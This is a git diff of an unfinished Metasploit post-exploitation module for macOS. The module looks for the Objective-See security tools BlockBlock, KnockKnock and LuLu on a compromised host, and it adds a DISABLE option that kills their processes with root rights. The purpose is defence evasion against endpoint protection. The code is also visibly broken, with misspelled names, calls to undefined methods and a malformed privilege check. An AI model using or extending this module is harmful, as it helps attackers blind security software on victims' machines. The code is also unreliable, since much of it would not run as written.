@@ -4,8 +4,9 @@
 ##
 
 class MetasploitModule < Msf::Post
-	require 'nokogiri'
 
+  include Msf::Post::OSX 
+  include Msf::Post::Process 
 
   def initialize(info = {})
     super(
@@ -22,15 +23,19 @@ class MetasploitModule < Msf::Post
         'URL'
         'SessionTypes' => [ 'meterpreter', 'shell' ]
       )
+
   )
+    register_options [
+      OptBool.new('DISABLE', [true, 'When set to true this module will disable all installed ObjectiveSee products by sending a kill signal to the associated ppid.', false] )
+    ]
   end
 
   # Holds information on an objective see product. i.e name, installation status user perms, group perms, owner, and location on filesystem.
   class ObjectiveSee
 
-    # Array of products present on system
-    @@present = []
-
+    # Arrays of products present on system & pid's of running processes
+    %w[present pids].each {|var| eval("@@#{var} = []", binding, __FILE__,__LINE__)}
+   
     def initalize(name)
       @name = name
       @path = "/Applications/#{name}"
@@ -49,33 +54,53 @@ class MetasploitModule < Msf::Post
     @installed = is_dir?(@path)
    end 
 
-   class << self
-    def present
-      @@present
+   def pid
+    # may return more than one pid need to test
+    @pid = pidof @name
+    print_status "DEBUG @pid = #{@pid.inspect} for @name = #{@nam}"
    end 
+
+   def running?
+    true unless @pid.nil?
+   end 
+
+   class << self
+     %w[present pids].each do |method|
+      define_method method do
+        eval "@@#{method}", binding, __FILE__, __LINE__
+      end 
+     end 
   end 
 
+  # determine which products are installed and their ppid if any
   def enumerate
-  	products = ["BlockBlock Helper.app", "KnockKnock.app", "LuLu.app"].map {|prod| ObjectiveSee.new prod}.filter_map {|product| product.installed? }
+  	products = ["BlockBlock Helper.app", "KnockKnock.app", "LuLu.app"].map {|prod| ObjectiveSee.new prod}
 
+    # we only want the products installed on the system
+    products = products.filter_map {|product| product.installed? }
+    products.each {|prod| print_status "#{prod.name} is installed."}
 
-
-  	# May also need to check if products are enabled 
-  	# How do I send a signal to a product and simulate hitting the enable/disable button? 
-  	# Is there a way to interact with the command line?
-
-  	# TODO use process monitor. Hit the disable button on LuLu find args, see if you can replicate in module
-  	# Check if apps are executable so you can check if you can send disable switch
-  	# Remove LuLu's peristence mechanism be it a login item, launch agent, launch daemon etc.
+    # determine which products are running. 
+    running = products.filter_map {|product| product.running? }
   end
 
-  def disable_LuLu
+  def disable
+    unless is_root? fail_with(Failure::NoAcces, "Can not disable products unless running as root. Please escelate privlleges before re-running the module.")
 
+    ObjectiveSee.running.each {|prod| kill_process prod.pid }
   end 
+
+  def disable_mode?
+    datastore['DISABLE']
+  end
 
   def exploit
   	print_status("Enumerating Objective See security products.")
-  	enumerate
+  	running = enumerate
+
+    if disable_mode?
+      disable_products
+    end 
   end
 
 end
